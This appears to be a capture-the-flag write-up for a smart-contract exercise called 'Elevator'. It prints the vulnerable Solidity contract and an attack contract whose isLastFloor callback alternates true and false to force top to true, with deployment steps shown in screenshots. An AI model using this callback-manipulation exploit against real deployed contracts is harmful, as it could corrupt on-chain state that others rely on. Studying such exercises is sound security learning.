# Task

This elevator won't let you reach the top of your building. Right?

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
This Solidity contract simulates an elevator system with two main components: `Building` and `Elevator`. The `Elevator` contract has a `goTo` function that takes a floor number and interacts with a `Building` contract (the caller). It first checks if the floor is the last floor using the `isLastFloor` function from the `Building` contract. If it's not the last floor, it updates the current floor and checks again to determine if the elevator is at the top floor. The `top` variable reflects whether the elevator has reached the top floor.

Lets get the contract address and contract abi

![image](https://github.com/user-attachments/assets/516d6c35-6444-48f6-aaa2-42618867c170)

We'll start out by using cast to check the state of the elevator

![image](https://github.com/user-attachments/assets/fb8e9fdf-ab41-4ed3-ad3e-f26a50dcd251)

We get the "false" response, this means we aren't at the top of the building yet

Lets check the floor we are at

![image](https://github.com/user-attachments/assets/111dcded-99a1-4041-bc06-9c533ab567f9)

We are at floor "0".

To solve this chall we have to be on the last floor. Lets write our attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./elevator.sol";

contract elevatorAttack {
   bool public toggle = true;
   Elevator public target;

   constructor(address _targetAddr) public {
    target = Elevator(_targetAddr);
   }
   
   function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
   }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```
what does this attack contract do??

1. It imports the `Elevator` contract and sets it as the target during construction (constructor).
2. The `isLastFloor` function alternates (toggles) between returning true and false on each call.
3. By alternating the `isLastFloor` return value, the `goTo` function in the `Elevato`r contract can be tricked into thinking it hasn’t reached the top floor, even when it has, due to the changing return value.
4. The `setTop` function is used to call the `goTo` function in the `Elevator` contract, exploiting this behavior to bypass the condition and manipulate the elevator's top status.


Lets deploy this attack contract with forge

![image](https://github.com/user-attachments/assets/65925b13-aaa0-44a1-bbfa-82150462beb8)

Now that we've successfully deployed this, lets interact with the functions

We'll start by setting the top to say "floor 20" 

![image](https://github.com/user-attachments/assets/61aa3195-57ba-409d-a65b-90c9475a6a52)

Nicee, our transaction got successful

Now, lets check the floor again

![image](https://github.com/user-attachments/assets/c5b0cedd-c783-4f62-b0e3-91427dd2b15e)

Good, we can now go ahead to check if we are at the top of the elevator or not

![image](https://github.com/user-attachments/assets/e116090a-dc35-45a4-8e9f-904159927b57)

We got the "true" output, which means we have successfully reached the top of the building

You can go ahead to submit the instance

![image](https://github.com/user-attachments/assets/54e745ce-906d-488e-8902-2e78cc499218)







































